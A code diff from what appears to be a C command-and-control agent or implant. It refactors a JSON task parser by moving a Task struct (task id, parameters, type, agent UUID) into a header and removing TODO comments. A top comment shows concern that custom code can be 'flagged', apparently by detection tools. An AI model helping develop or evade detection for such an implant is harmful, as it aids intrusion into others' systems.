@@ -1,9 +1,9 @@
 // TODO: Using custom implementations of functionalities such as trimming and parsing is not okay as they can easily be flagged
-// TODO: is readJsonTask still modifying json?
 
 #include "../include/addresshunter.h"
 #include "../include/http.h"
 #include "../include/typedefs.h"
+#include "../include/task.h"
 #include <time.h>
 
 // will be overwritten by ImhulluCLI
@@ -351,14 +351,6 @@ CHAR* myTrim(PAPI api, CCHAR* str, CHAR trim)
     return outStr;
 }
 
-typedef struct Task_
-{
-    CHAR* taskId;
-    CHAR* taskParams;
-    CHAR* taskType;
-    CHAR* agentUuid;
-} Task, *PTask;
-
 /*
 This function reads and parses a task in json format
 
@@ -380,9 +372,6 @@ Output:
 
 Note:
     If the `task` member of json is empty (a.k.a. what to run is determined only by `taskType`) the return value is empty string that still `needs to be freed`
-
-    // TODO: This function can be improved by using a struct to hold the json
-
 */
 Task readJsonTask(PAPI api, CHAR* json)
 {
@@ -404,7 +393,7 @@ Task readJsonTask(PAPI api, CHAR* json)
     ]
     */
 
-    Task task = {NULL, NULL, NULL, NULL};
+    Task task = { NULL };
 
     CHAR* tmpJson = json;  // myStrtok modifies the string itself
     CHAR delim = { '\n' };
@@ -425,8 +414,6 @@ Task readJsonTask(PAPI api, CHAR* json)
     CHAR* token;
     CHAR* trimmedToken1;
     CHAR* trimmedToken2;
-
-    // this part of the code messy and can be improved using a struct(?)
 
     // start with the third line in the json because the first two are '['
     token = getToken(api, tokensStruct, 2);
